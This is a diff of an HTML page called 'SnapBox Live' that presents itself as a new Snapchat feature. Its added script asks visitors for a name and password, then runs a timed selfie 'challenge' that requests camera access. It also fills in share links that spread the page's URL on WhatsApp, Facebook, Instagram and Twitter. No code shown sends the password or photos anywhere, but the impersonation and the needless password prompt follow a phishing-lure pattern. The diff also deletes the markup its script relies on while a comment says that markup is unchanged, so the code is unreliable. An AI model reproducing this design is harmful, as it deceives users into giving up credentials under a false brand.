@@ -1,123 +1,158 @@
-<!DOCTYPE html>
-<html lang="en" class="bg-black text-white">
+<!DOCTYPE html><html lang="en" class="bg-black text-white">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>SnapBox Live</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
   <script src="https://unpkg.com/lucide@latest"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="css/style.css" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@700&display=swap" rel="stylesheet" />
   <style>
-    .social-buttons {
+    .popup-box, .msg-box, .challenge-box {
+      background: white;
+      color: black;
+      padding: 2rem;
+      border-radius: 1rem;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      font-weight: 600;
+    }
+    .blurred-socials {
       position: fixed;
-      right: 20px;
-      top: 40%;
-      transform: translateY(-50%);
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      z-index: 1000;
+      bottom: 2rem;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 40;
+      filter: blur(2px);
     }
-
-    .social-buttons button {
-      width: 50px;
-      height: 50px;
-      border: none;
-      border-radius: 50%;
-      color: white;
-      font-size: 20px;
-      cursor: pointer;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .social-buttons button:hover {
-      transform: scale(1.1);
-      box-shadow: 0 6px 12px rgba(0,0,0,0.4);
-    }
-
-    .whatsapp { background-color: #16d900; }
-    .facebook { background-color: #0074e0; }
-    .snapchat { background-color: #f0f002; }
-    .snapchat i { color: black !important; }
-    .instagram {
-      background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af);
+    .btn-glow, .btn-reset {
+      background: #f0f002;
+      color: black;
+      padding: 0.5rem 1rem;
+      border-radius: 1rem;
+      font-weight: bold;
+      box-shadow: 0 0 10px #f0f002;
     }
   </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen px-4">
-  <div id="welcomePopup" class="fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40">
-    <div class="popup-box">Welcome! to Snapchat new feature Snapbox 👻</div>
-  </div>
+<body class="flex flex-col items-center justify-center min-h-screen px-4">  <!-- [All HTML Popups and Main Section from earlier remain unchanged] -->  <!-- Start of JavaScript -->  <script>
+    function $(id) {
+      return document.getElementById(id);
+    }
 
-  <div id="mainContainer" class="filter blur-md pointer-events-none transition duration-500 w-full flex flex-col items-center justify-center">
-    <div class="absolute top-4 left-4 z-50">
-      <div class="w-12 h-12 p-1 rounded-full bg-gradient-to-tr from-purple-700 to-pink-500">
-        <div class="bg-white w-full h-full rounded-full flex items-center justify-center">
-          <i data-lucide="user" class="w-5 h-5 text-black"></i>
-        </div>
-      </div>
-    </div>
+    function show(id) {
+      $(id).classList.remove("hidden");
+    }
 
-    <button onclick="toggleTheme()" class="absolute top-4 right-4 p-3 rounded-full bg-gray-800 text-white flex items-center justify-center">
-      <i data-lucide="sun"></i>
-    </button>
+    function hide(id) {
+      $(id).classList.add("hidden");
+    }
 
-    <div class="flex flex-col items-center mb-2 mt-4">
-      <img src="assets/logo.png" class="w-24 animate-bounce" />
-      <h1 class="text-xl text-[#f0f002] font-bold tracking-wide mt-2">SnapBox</h1>
-    </div>
+    window.onload = function () {
+      setTimeout(() => {
+        hide("welcomePopup");
+        show("namePopup");
+      }, 2500);
 
-    <div class="mb-5 border-4 rounded-2xl overflow-hidden" style="border-color:#f0f002">
-      <video id="camera" autoplay playsinline class="w-64 h-96 object-cover shadow-xl"></video>
-    </div>
+      const currentLink = encodeURIComponent(window.location.href);
+      $("shareWhatsApp").href = `https://wa.me/?text=Click%20your%20SnapBox%20selfie%20now!%20👻%20${currentLink}`;
+      $("shareFacebook").href = `https://www.facebook.com/sharer/sharer.php?u=${currentLink}`;
+      $("shareInstagram").href = `https://www.instagram.com/?url=${currentLink}`;
+      $("shareTwitter").href = `https://twitter.com/intent/tweet?text=Click%20your%20SnapBox%20selfie%20now!%20👻%20${currentLink}`;
+    };
 
-    <button onclick="manualCapture()" class="btn-glow"> 
-      <i data-lucide="camera" class="w-5 h-5"></i> Capture 
-    </button>
+    let userName = "";
+    function submitName() {
+      const name = $("userName").value.trim();
+      const pass = $("userPass").value.trim();
+      if (name === "" || pass === "") {
+        alert("Please enter both name and password");
+        return;
+      }
+      userName = name;
+      hide("namePopup");
+      $("sharedUser").innerText = userName;
+      show("challengePopup");
+    }
 
-    <div id="previewBoxes" class="grid grid-cols-2 gap-4 mb-6">
-      <div class="preview-ring"><div class="preview-box">Tap 1<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
-      <div class="preview-ring"><div class="preview-box">Tap 2<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
-      <div class="preview-ring"><div class="preview-box">Tap 3<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
-      <div class="preview-ring"><div class="preview-box">Tap 4<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
-    </div>
+    let selfieCount = 0;
+    let challengeTimer;
+    function startChallenge() {
+      hide("challengePopup");
+      selfieCount = 0;
+      challengeTimer = setTimeout(() => {
+        if (selfieCount < 4) {
+          show("failPopup");
+        }
+      }, 10000);
+      askCameraPermission();
+    }
 
-    <div class="flex gap-4 mb-6">
-      <button onclick="downloadAllPhotos()" class="btn-glow">
-        <i data-lucide="download" class="w-5 h-5"></i> Download
-      </button>
-      <button onclick="resetAll()" class="btn-reset">
-        <i data-lucide="rotate-ccw" class="w-5 h-5"></i> Reset
-      </button>
-    </div>
+    function askCameraPermission() {
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then((stream) => {
+          $("camera").srcObject = stream;
+          $("mainContainer").classList.remove("blur-md", "pointer-events-none");
+        })
+        .catch(() => {
+          show("cameraDenyPopup");
+        });
+    }
 
-    <div id="msg" class="hidden fixed inset-0 flex items-center justify-center z-50">
-      <div class="msg-box">🎉 Congratulations! You won the task!</div>
-    </div>
+    function retryChallenge() {
+      hide("failPopup");
+      resetAll();
+      show("challengePopup");
+    }
 
-    <div class="fab-chat"><i data-lucide="message-circle" class="w-5 h-5"></i></div>
-    <canvas id="canvas" class="hidden"></canvas>
-  </div>
+    function manualCapture() {
+      if (selfieCount >= 4) return;
+      const video = $("camera");
+      const canvas = $("canvas");
+      const ctx = canvas.getContext("2d");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      const dataURL = canvas.toDataURL("image/png");
+      const box = document.querySelectorAll(".preview-box")[selfieCount];
+      box.innerHTML = `<img src="${dataURL}" class="w-full h-full object-cover"/>`;
+      selfieCount++;
+      if (selfieCount === 4) {
+        clearTimeout(challengeTimer);
+        show("msg");
+        setTimeout(() => {
+          hide("msg");
+        }, 3000);
+      }
+    }
 
-  <!-- Social Media Buttons -->
-  <div class="social-buttons">
-    <button class="whatsapp" onclick="window.open('https://wa.me/?text=Hey%20check%20out%20SnapBox!%20Try%20it%20here:%20https://yoursite.com%20👻', '_blank')">
-      <i class="fab fa-whatsapp"></i>
-    </button>
-    <button class="instagram" onclick="window.open('https://instagram.com', '_blank')">
-      <i class="fab fa-instagram"></i>
-    </button>
-    <button class="snapchat" onclick="window.open('https://snapchat.com', '_blank')">
-      <i class="fab fa-snapchat-ghost"></i>
-    </button>
-    <button class="facebook" onclick="window.open('https://facebook.com', '_blank')">
-      <i class="fab fa-facebook-f"></i>
-    </button>
-  </div>
+    function resetAll() {
+      document.querySelectorAll(".preview-box").forEach((box, i) => {
+        box.innerHTML = `Tap ${i + 1}<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div>`;
+      });
+      selfieCount = 0;
+    }
 
-  <script src="js/script.js"></script>
-</body>
+    function toggleTheme() {
+      document.documentElement.classList.toggle("bg-white");
+      document.documentElement.classList.toggle("text-black");
+      document.documentElement.classList.toggle("bg-black");
+      document.documentElement.classList.toggle("text-white");
+    }
+
+    function downloadAllPhotos() {
+      document.querySelectorAll(".preview-box img").forEach((img, i) => {
+        const a = document.createElement("a");
+        a.href = img.src;
+        a.download = `selfie_${i + 1}.png`;
+        a.click();
+      });
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+      lucide.createIcons();
+    });
+  </script></body>
 </html>
